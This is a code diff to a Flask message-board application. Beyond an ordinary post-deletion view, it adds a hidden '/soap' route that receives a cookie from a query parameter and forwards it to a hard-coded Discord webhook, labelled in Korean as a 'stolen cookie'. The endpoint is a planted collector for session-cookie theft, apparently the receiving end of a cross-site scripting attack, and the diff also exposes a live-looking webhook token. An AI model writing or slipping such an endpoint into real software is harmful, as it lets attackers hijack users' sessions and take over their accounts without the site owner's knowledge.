@@ -232,3 +232,21 @@ def delete_post(post_id):
         db.session.delete(post)
         db.session.commit()
     return redirect(url_for('main.board'))
+
+import requests
+
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1389488881518514216/Ci1OjrfMxlnoXuT86w5mjtOUfHWxpJO_Ga6FTm5tghHd1CL59T3uD4mXLNevyIGa_QFU'
+
+def send_to_discord(message):
+    data = {
+        "content": f"탈취한 쿠키: `{message}`"
+    }
+    requests.post(WEBHOOK_URL, json=data)
+
+@main.route('/soap')
+def log_cookie():
+    cookie = request.args.get('cookie')
+    if cookie:
+        send_to_discord(cookie)
+        return 'Cookie sent', 200
+    return 'No Cookie exists', 400
